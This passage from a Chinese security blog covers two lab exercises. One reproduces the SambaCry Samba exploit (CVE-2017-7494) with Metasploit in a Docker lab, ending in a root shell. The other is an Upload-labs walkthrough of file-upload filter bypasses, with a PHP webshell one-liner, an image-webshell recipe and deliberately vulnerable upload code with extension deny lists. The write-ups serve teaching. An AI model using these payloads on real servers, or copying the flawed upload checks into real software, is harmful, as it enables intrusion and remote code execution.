后来看别人的解决办法才发现，是因为我当前的用户没有在docker组内，所以无法连接 ┌─[knlvre@knlvre-PC]─[~/Desktop/CVE-2017-7494] └──╼ $tail -5 /etc/group ... docker:x:998: 切换到root用户，将当前用户添加进 docker组 ┌─[knlvre@knlvre-PC]─[~/Desktop/CVE-2017-7494] └──╼ $sudo su root@knlvre-PC:~# usermod -a -G docker knlvre root@knlvre-PC:~# tail -5 /etc/group ... docker:x:998:knlvre root@knlvre-PC:~# exit 然后再次运行 docker-compose 时就能正常运行。但是马上又出问题了，提示端口冲突，查看一下本机的端口，445端口已经被占用 ┌─[knlvre@knlvre-PC]─[~/Desktop/CVE-2017-7494] └──╼ $netstat -ntlp Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:139 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:445 0.0.0.0:* LISTEN - ... 那现在就更改 docker-compose.yml 内的默认端口（冒号前代表本机端口，冒号后代表 container 的端口） ┌─[knlvre@knlvre-PC]─[~/Desktop/CVE-2017-7494] └──╼ $cat docker-compose.yml version: &#39;2&#39; services: samba: image: vulhub/samba:4.6.3 tty: true volumes: - ./smb.conf:/usr/local/samba/etc/smb.conf ports: - &quot;445:445&quot; ┌─[knlvre@knlvre-PC]─[~/Desktop/CVE-2017-7494] └──╼ $vi docker-compose.yml ┌─[knlvre@knlvre-PC]─[~/Desktop/CVE-2017-7494] └──╼ $cat docker-compose.yml version: &#39;2&#39; services: samba: image: vulhub/samba:4.6.3 tty: true volumes: - ./smb.conf:/usr/local/samba/etc/smb.conf ports: - &quot;4445:445&quot; 然后再次运行命令 docker-compose up -d 就能启动，查看正在运行的 images 和 container ┌─[knlvre@knlvre-PC]─[~/Desktop/CVE-2017-7494] └──╼ $docker images REPOSITORY TAG IMAGE ID CREATED SIZE vulhub/samba 4.6.3 e37802d9a4e5 2 years ago 622MB ┌─[knlvre@knlvre-PC]─[~/Desktop/CVE-2017-7494] └──╼ $docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 0171828a7e0b vulhub/samba:4.6.3 &quot;/usr/local/samba/sb…&quot; About an hour ago Up 4 minutes 137-138/udp, 139/tcp, 0.0.0.0:4445-&gt;445/tcp cve-2017-7494_samba_1 开始攻击 切换到kali，先扫描端口 root@Knlvre:~# nmap -sV 192.168.199.186 ... PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 4445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP) ... 的确有4445，并且是smb服务 现在用MSF的exploit/linux/samba/is_known_pipename模块（因为我们修改了端口，记得要把端口设置为4445） msf5 &gt; use exploit/linux/samba/is_known_pipename msf5 exploit(linux/samba/is_known_pipename) &gt; set RHOSTS 192.168.199.186 RHOSTS =&gt; 192.168.199.186 msf5 exploit(linux/samba/is_known_pipename) &gt; set RPORT 4445 RPORT =&gt; 4445 msf5 exploit(linux/samba/is_known_pipename) &gt; exploit [*] 192.168.199.186:4445 - Using location \\\\192.168.199.186\\myshare\\ for the path [*] 192.168.199.186:4445 - Retrieving the remote path of the share &#39;myshare&#39; [*] 192.168.199.186:4445 - Share &#39;myshare&#39; has server-side path &#39;/home/share [*] 192.168.199.186:4445 - Uploaded payload to \\\\192.168.199.186\\myshare\\cOYCTPyO.so [*] 192.168.199.186:4445 - Loading the payload from server-side path /home/share/cOYCTPyO.so using \\\\PIPE\\/home/share/cOYCTPyO.so... [-] 192.168.199.186:4445 - &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND [*] 192.168.199.186:4445 - Loading the payload from server-side path /home/share/cOYCTPyO.so using /home/share/cOYCTPyO.so... [+] 192.168.199.186:4445 - Probe response indicates the interactive payload was loaded... [*] Found shell. [*] Command shell session 1 opened (192.168.199.134:36949 -&gt; 192.168.199.186:4445) at 2019-10-17 21:34:15 +0800 id uid=0(root) gid=0(root) groups=0(root) 跑完直接拿到root权限，复现到此结束 Reference https://www.jianshu.com/p/24c7494971a8 https://bbs.ichunqiu.com/thread-23281-1-1.html","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://knlvre.github.io/tags/渗透测试/"}],"author":"Knlvre"},{"title":"Upload-labs Write Up","slug":"Upload-labs Write Up","date":"2019-09-19T16:00:00.000Z","updated":"2019-11-22T04:08:05.096Z","comments":true,"path":"2019/09/20/Upload-labs Write Up/","link":"","permalink":"https://knlvre.github.io/2019/09/20/Upload-labs Write Up/","excerpt":"","text":"Less-1本关介绍两种解题方法： 方法一 直接上传webshell.php时，发现前端弹出警告。按F12查看，在javascript的白名单中添加php这个后缀，然后就可以直接上传成功 方法二 先将webshell的后缀改为png（或者白名单中任意后缀），然后上传，Burpsuit将数据包进行修改，重新将文件后缀改为.php，绕过前端验证就可以 核心代码 function checkFile() { var file = document.getElementsByName(&#39;upload_file&#39;)[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; } } Less-2直接上传.php文件会提示文件类型不正确，请重新上传！。将文件后缀改为.png，抓包修改文件后缀为.php 直接上传成功，蚁剑连接成功 核心代码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;文件类型不正确，请重新上传！&#39;; } } else { $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;; } } Less-3 shell.phtml、shell.php3、shell.php5 等 直接上传.php文件会提示不允许上传.asp,.aspx,.php,.jsp后缀文件！。将文件后缀改为.png，和 Less-2 一样抓包修改文件后缀，还是出现同样的提示 按照提示来看，应该是采用黑名单，那就用.php3试着绕过，发现上传成功（php3、php5、phtml） 但是这些后缀名我的蚁剑都不能连接，一句话内容更改为代码执行的命令时，也只有phtml能被解析 &lt;?php echo system($_GET[&#39;pass&#39;]); ?&gt; 核心代码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } Less-4 .htaccess 直接上传.php文件只是提示此文件不允许上传!。将文件后缀改为.png，和 Less-2 一样抓包修改文件后缀为php或phtml等，还是出现同样的提示 但是可以上传.htaccess，内容如下（该行代码的作用是使服务器将所有类型的文件都解析为php） SetHandler application/x-httpd-php 在使用 .htaccess 之前，需要先开启对其的支持 Linux：修改 /etc/apache2/apache2.conf 内的 AllowOverride 为 ALL（默认None）。然后重启 apache2 服务器 上传成功后，我们上传一个大马，后缀随意 成功上传并且可以解析连接 核心代码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;此文件不允许上传!&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } Less-5 shell.PHP、shell.PhP 等大小写 先尝试前面的步骤，本关连.htaccess都无法上传，但是本关却可以通过大小写来绕过，尝试.PHP 尝试连接，成功 注意：大写PHP后缀名的解析，同样只存在于部分版本的apache 核心代码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;此文件类型不允许上传！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 本题从源码中可以看出来，前一关将后缀转换成小写的函数strtolower()在本关没有使用，所以可以导致大小写绕过黑名单 Less-6 shell.php (+ 空格) 本关弥补了前一关的缺陷，对后缀名用strtolower()函数处理，所以前一关大写的PHP会变为php，还在黑名单之内，所以无法绕过。但是本关可以利用添加空格绕过黑名单，因为strrchr()获取.之后的内容，当我们添加空格时，自然也会被获取，但是黑名单中并没有后缀名+空格的形式，所以匹配失败，上传成功 可以绕过，那现在就是试一下实际上传效果，并且看上传上去后，能不能被正常解析 可以被正常解析 在上传文件夹内查看文件名，发现php后面并没有空格，这说明 空格 可以帮助我们绕过黑名单，并且生成文件时没有被保存下来 核心代码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } Less-7 shell.php. Windows 自动去掉文件名末尾的点 本关弥补了前一关的缺陷，对后缀名用trim()函数处理，去掉了前后空格。但是本关相比前一关少了deldot()函数，没有对后缀中的点(.)进行删除，可以利用Windows的特性：会自动去掉文件名末尾的点(.)来绕过黑名单 可以访问解析 看一下文件名 核心代码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;此文件类型不允许上传！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } Less-8 shell.php::$DATA Windows 文件的流特性 相比于上一关，少了过滤::$DATA字符串， 可以用这个上传 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA 这个是关于 Windows 下备用数据流 ，可以参考一下这篇文章：Windows ::DATA alternate data stream 所以现在就可以利用这个来上传 可以访问 文件末尾自动去掉了::$DATA字符串 核心代码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;此文件类型不允许上传！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } Less-9 shell.php. .(点 + 空格 + 点) 逻辑漏洞 这关的漏洞点在于上传的文件名直接使用处理后的$file_name（$_FILE[&#39;upload_file&#39;][&#39;name&#39;]），与后缀名的检查分开了，这样导致我们可以分开构造文件名和后缀名，算是一种逻辑漏洞 move_uploaded_file($temp_file, $img_path) 可以使文件名为shell.php. .（点+空格+点），这样strrchr()截取到的结果是. + 空格，不再黑名单内，然后上传的文件名为shell.php.，Windows的解析特性：末尾空格会忽略（这就与 Less-7 情况一样） 可以访问并解析 但是不理解为什么末尾2个点中间要加空格，不加空格的话，strrchr() 函数截取到.，照样不在黑名单内 核心代码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;此文件类型不允许上传！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } Less-10 shell.pphphp str_replace() 函数匹配一次，双写绕过 本关看到很熟悉的函数str_ireplace()，与str_replace()的区别就是大小写敏感，他们都只进行一次匹配，所以可以直接双写绕过 可以访问并解析 核心代码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } Less-11 move_uploaded_file() 的 %00 截断（CVE-2015-2348） 关于%00截断绕过可以参考这篇文章：关于上传中的00截断分析 %00 截断是比较古老的漏洞，而且必须要有 2 个前提 php 版本低于 5.3.29 php.ini 的 magic_quotes_gpc = Off 文件上传的位置用了$_GET[&#39;save_path&#39;]，与文件后缀的检查分开了，所以我们可以通过控制$_GET[&#39;save_path&#39;]的值来控制文件名称，使用%00截断后面的其他内容，使得$img_path的值就只等于$_GET[&#39;save_path&#39;] 上传的文件名正常，如我们意料地被截断了 可以访问并解析 核心代码 $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } Less-12 shell.php%00(urldecode) 本关其他代码没变，只是save_path由GET变成了POST。方法还是一样，但是由于 POST 方式不会自动进行URL解码， 所以需要将%00手动解码之后再放进去，否则会报错 核心代码 $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传失败&quot;; } } else { $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } Less-13 本地文件包含 + 图片马 图片马制作：copy normal.jpg /b + shell.php /a shell.jpg 出现了新的提示 从源代码可以看出来，对文件的读取只读了2个字节，然后判断类型，并且将类型直接作为文件最后的后缀。这个就没办法绕过了，只能写进去图片马，找include()或者解析漏洞来用马。生成图片马： copy normal.jpg /b + shell.php /a webshell.jpg 然后上传 我们在服务器内写一个能够文件包含的页面，模拟漏洞 本地文件包含 的漏洞（include 的文件都当做php文件来解析） 然后查看图片马的名称，并包含我们的图片马 写一句话，然后菜刀连接 核心代码 function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); $fileType = &#39;&#39;; switch($typeCode){ case 255216: $fileType = &#39;jpg&#39;; break; case 13780: $fileType = &#39;png&#39;; break; case 7173: $fileType = &#39;gif&#39;; break; default: $fileType = &#39;unknown&#39;; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_type = getReailFileType($temp_file); if($file_type == &#39;unknown&#39;){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } } } Less-14 本地文件包含 + 图片马 getimagesize() image_type_to_extension() getimagesize()函数 image_type_to_extension()函数 所以本关是通过getimagesize()获取到类型，上一关的方法还可以使用 核心代码 function isImage($filename){ $types = &#39;.jpeg|.png|.gif&#39;; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; } } 